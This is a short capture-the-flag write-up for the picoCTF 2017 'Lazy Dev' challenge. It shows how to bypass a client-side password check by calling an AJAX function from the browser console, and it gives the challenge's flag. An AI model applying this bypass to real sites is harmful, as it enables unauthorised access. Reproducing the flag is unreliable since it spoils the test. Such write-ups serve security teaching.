## Lazy Dev [50 Points]

I really need to login to this [website](http://shell2017.picoctf.com:46677/), but the developer hasn't implemented login yet. Can you help?

**Hints:**

- Where does the password check actually occur?
- Can you interact with the javascript directly?

**Solution:**

http://shell2017.picoctf.com:46677/static/client.js

The validate password function always returns false
```
//Validate the password. TBD!
function validate(pword){
  //TODO: Implement me
  return false;
}
```

We can execute the ajax request with pw_valid=true, bypassing the validate function
```
//Make an ajax request to the server
function make_ajax_req(input){
  var text_response;
  var http_req = new XMLHttpRequest();
  var params = "pword_valid=" + input.toString();
  http_req.open("POST", "login", true);
  http_req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http_req.onreadystatechange = function() {//Call a function when the state changes.
  	if(http_req.readyState == 4 && http_req.status == 200) {
      document.getElementById("res").innerHTML = http_req.responseText;
    }
  }
  http_req.send(params);
}
```

Open Javascript console (Ctrl+Shift+J)
```
make_ajax_req(true)
```

**Flag:** client_side_is_the_dark_sidee5dbd5f8c6ae5e282766571e06569d50
